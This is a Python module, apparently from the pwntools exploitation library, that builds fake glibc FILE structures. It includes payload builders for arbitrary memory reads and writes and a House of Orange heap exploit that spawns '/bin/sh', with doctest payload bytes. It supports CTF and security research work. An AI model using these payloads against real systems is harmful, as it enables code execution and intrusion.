# -*- coding: utf-8 -*-

r"""
File Structure Exploitation

struct FILE (_IO_FILE) is the structure for File Streams.
This offers various targets for exploitation on an existing bug in the code.
Examples - ``_IO_buf_base`` and ``_IO_buf_end`` for reading data to arbitrary location.

Remembering the offsets of various structure members while faking a FILE structure can be difficult,
so this python class helps you with that. Example-

>>> context.clear(arch='amd64')
>>> fileStr = FileStructure(null=0xdeadbeef)
>>> fileStr.vtable = 0xcafebabe
>>> payload = bytes(fileStr)
>>> payload
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00'

Now payload contains the FILE structure with its vtable pointer pointing to 0xcafebabe

Currently only 'amd64' and 'i386' architectures are supported
"""

from __future__ import absolute_import
from __future__ import division

from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.util.misc import python_2_bytes_compatible
from pwnlib.util.packing import pack

log = getLogger(__name__)

length=0
size='size'
name='name'

variables={
    0:{name:'flags',size:length},
    1:{name:'_IO_read_ptr',size:length},
    2:{name:'_IO_read_end',size:length},
    3:{name:'_IO_read_base',size:length},
    4:{name:'_IO_write_base',size:length},
    5:{name:'_IO_write_ptr',size:length},
    6:{name:'_IO_write_end',size:length},
    7:{name:'_IO_buf_base',size:length},
    8:{name:'_IO_buf_end',size:length},
    9:{name:'_IO_save_base',size:length},
    10:{name:'_IO_backup_base',size:length},
    11:{name:'_IO_save_end',size:length},
    12:{name:'markers',size:length},
    13:{name:'chain',size:length},
    14:{name:'fileno',size:4},
    15:{name:'_flags2',size:4},
    16:{name:'_old_offset',size:length},
    17:{name:'_cur_column',size:2},
    18:{name:'_vtable_offset',size:1},
    19:{name:'_shortbuf',size:1},
    20:{name:'unknown1',size:-4},
    21:{name:'_lock',size:length},
    22:{name:'_offset',size:8},
    23:{name:'_codecvt',size:length},
    24:{name:'_wide_data',size:length},
    25:{name:'unknown2',size:length},
    26:{name:'vtable',size:length}
}

del name, size, length


def update_var(l):
    r"""
    Since different members of the file structure have different sizes, we need to keep track of the sizes. The following function is used by the FileStructure class to initialise the lengths of the various fields.

    Arguments:
        l(int)
            l=8 for 'amd64' architecture and l=4 for 'i386' architecture

    Return Value:
        Returns a dictionary in which each field is mapped to its corresponding length according to the architecture set

    Examples:

        >>> update_var(8)
        {'flags': 8, '_IO_read_ptr': 8, '_IO_read_end': 8, '_IO_read_base': 8, '_IO_write_base': 8, '_IO_write_ptr': 8, '_IO_write_end': 8, '_IO_buf_base': 8, '_IO_buf_end': 8, '_IO_save_base': 8, '_IO_backup_base': 8, '_IO_save_end': 8, 'markers': 8, 'chain': 8, 'fileno': 4, '_flags2': 4, '_old_offset': 8, '_cur_column': 2, '_vtable_offset': 1, '_shortbuf': 1, 'unknown1': 4, '_lock': 8, '_offset': 8, '_codecvt': 8, '_wide_data': 8, 'unknown2': 48, 'vtable': 8}
    """
    var={}
    for i in variables:
        var[variables[i]['name']]=variables[i]['size']
    for i in var:
        if var[i]<=0:
            var[i]+=l
    if l==4:
        var['unknown2']=56
    else:
        var['unknown2']=48
    return var


@python_2_bytes_compatible
class FileStructure(object):
    r"""
    Crafts a FILE structure, with default values for some fields, like _lock which should point to null ideally, set.

    Arguments:
        null(int)
            A pointer to NULL value in memory. This pointer can lie in any segment (stack, heap, bss, libc etc)

    Examples:

        FILE structure with flags as 0xfbad1807 and _IO_buf_base and _IO_buf_end pointing to 0xcafebabe and 0xfacef00d

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(null=0xdeadbeeef)
        >>> fileStr.flags = 0xfbad1807
        >>> fileStr._IO_buf_base = 0xcafebabe
        >>> fileStr._IO_buf_end = 0xfacef00d
        >>> payload = bytes(fileStr)
        >>> payload
        b'\x07\x18\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00\r\xf0\xce\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xee\xdb\xea\r\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xee\xdb\xea\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

        Check the length of the FileStructure

        >>> len(fileStr)
        224

        The defination for __repr__ orders the structure members and displays then in a dictionary format. It's useful when viewing a structure objet in python/IPython shell

        >>> q=FileStructure(0xdeadbeef)
        >>> q
        { flags: 0x0
         _IO_read_ptr: 0x0
         _IO_read_end: 0x0
         _IO_read_base: 0x0
         _IO_write_base: 0x0
         _IO_write_ptr: 0x0
         _IO_write_end: 0x0
         _IO_buf_base: 0x0
         _IO_buf_end: 0x0
         _IO_save_base: 0x0
         _IO_backup_base: 0x0
         _IO_save_end: 0x0
         markers: 0x0
         chain: 0x0
         fileno: 0x0
         _flags2: 0x0
         _old_offset: 0xffffffffffffffff
         _cur_column: 0x0
         _vtable_offset: 0x0
         _shortbuf: 0x0
         unknown1: 0x0
         _lock: 0xdeadbeef
         _offset: 0xffffffffffffffff
         _codecvt: 0x0
         _wide_data: 0xdeadbeef
         unknown2: 0x0
         vtable: 0x0}
    """

    vars_=[]
    length={}

    def __init__(self, null=0):
            self.vars_ = [variables[i]['name'] for i in sorted(variables.keys())]
            self.setdefault(null)
            self.length = update_var(context.bytes)
            self._old_offset = (1 << context.bits) - 1

    def __setattr__(self,item,value):
        if item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self,item,value)
        else:
            log.error("Unknown variable %r" % item)

    def __repr__(self):
        structure=[]
        for i in self.vars_:
            structure.append(" %s: %s" % (i,hex(self.__getattr__(i))))
        return "{"+ "\n".join(structure)+"}"

    def __getattr__(self,item):
        if item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self,item)
        log.error("Unknown variable %r" % item)

    def __len__(self):
        return len(bytes(self))

    def __bytes__(self):
        structure = b''
        for val in self.vars_:
            if isinstance(self.__getattr__(val), bytes):
                structure += self.__getattr__(val).ljust(context.bytes, b'\x00')
            else:
                structure += pack(self.__getattr__(val), self.length[val]*8)
        return structure

    def struntil(self,v):
        r"""
        Payload for stuff till 'v' where 'v' is a structure member. This payload includes 'v' as well.

        Arguments:
            v(string)
                The name of the field uptil which the payload should be created.

        Example:

            Payload for data uptil _IO_buf_end

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.struntil("_IO_buf_end")
            >>> payload
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        """
        if v not in self.vars_:
            return b''
        structure = b''
        for val in self.vars_:
            if isinstance(self.__getattr__(val), bytes):
                structure += self.__getattr__(val).ljust(context.bytes, b'\x00')
            else:
                structure += pack(self.__getattr__(val), self.length[val]*8)
            if val == v:
                break
        return structure[:-1]

    def setdefault(self,null):
            self.flags=0
            self._IO_read_ptr=0
            self._IO_read_end=0
            self._IO_read_base=0
            self._IO_write_base=0
            self._IO_write_ptr=0
            self._IO_write_end=0
            self._IO_buf_base=0
            self._IO_buf_end=0
            self._IO_save_base=0
            self._IO_backup_base=0
            self._IO_save_end=0
            self.markers=0
            self.chain=0
            self.fileno=0
            self._flags2=0
            self._old_offset=0
            self._cur_column=0
            self._vtable_offset=0
            self._shortbuf=0
            self.unknown1=0
            self._lock=null
            self._offset=0xffffffffffffffff
            self._codecvt=0
            self._wide_data=null
            self.unknown2=0
            self.vtable=0

    def write(self,addr=0,size=0):
        r"""
        Writing data out from arbitrary memory address.

        Arguments:
            addr(int)
                The address from which data is to be printed to stdout
            size(int)
                The size, in bytes, of the data to be printed

        Example:

            Payload for writing 100 bytes to stdout from the address 0xcafebabe

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.write(addr=0xcafebabe, size=100)
            >>> payload
            b'\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00"\xbb\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00'
        """
        self.flags &=~8
        self.flags |=0x800
        self._IO_write_base = addr
        self._IO_write_ptr = addr+size
        self._IO_read_end = addr
        self.fileno = 1
        return self.struntil('fileno')

    def read(self,addr=0,size=0):
        r"""
        Reading data into arbitrary memory location.

        Arguments:
            addr(int)
                The address into which data is to be written from stdin
            size(int)
                The size, in bytes, of the data to be written

        Example:

            Payload for reading 100 bytes from stdin into the address 0xcafebabe

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.read(addr=0xcafebabe, size=100)
            >>> payload
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00"\xbb\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        """
        self.flags &=~4
        self._IO_read_base = 0
        self._IO_read_ptr = 0
        self._IO_buf_base = addr
        self._IO_buf_end = addr+size
        self.fileno = 0
        return self.struntil('fileno')

    def orange(self,io_list_all,vtable):
        r"""
        Perform a House of Orange (https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c), provided you have libc leaks.

        Arguments:
            io_list_all(int)
                Address of _IO_list_all in libc.
            vtable(int)
                Address of the fake vtable in memory

        Example:

            Example payload if address of _IO_list_all is 0xfacef00d and fake vtable is at 0xcafebabe -

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.orange(io_list_all=0xfacef00d, vtable=0xcafebabe)
            >>> payload
            b'/bin/sh\x00a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfd\xef\xce\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00'
        """
        if context.bits == 64:
            self.flags = b'/bin/sh\x00'
            self._IO_read_ptr = 0x61
            self._IO_read_base = io_list_all-0x10
        elif context.bits == 32:
            self.flags = b'sh\x00'
            self._IO_read_ptr = 0x121
            self._IO_read_base = io_list_all-0x8
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self.vtable = vtable
        return self.__bytes__()
